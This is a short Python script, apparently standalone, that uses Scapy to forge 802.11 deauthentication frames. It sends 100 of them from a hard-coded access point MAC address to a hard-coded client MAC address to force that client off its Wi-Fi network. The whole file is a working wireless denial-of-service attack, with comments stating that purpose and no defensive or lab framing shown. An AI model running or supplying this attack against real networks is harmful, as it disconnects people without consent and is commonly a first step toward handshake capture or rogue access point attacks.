from scapy.all import *
import time

bssid = "5c:8f:e0:cc:36:01"  # MAC address of the access point
client = "58:2f:40:09:7d:24"  # MAC address of the client


# sends a deauthentication packet to the client
def deAuth(client, bssid):
    dot11 = Dot11(addr1=client, addr2=bssid, addr3=bssid)
    frame = RadioTap() / dot11 / Dot11Deauth()
    sendp(frame, iface="Wi-Fi", count=100, inter=0.100)


# disconnect the client by sending 100 packets of deauthentication
deAuth(client, bssid)
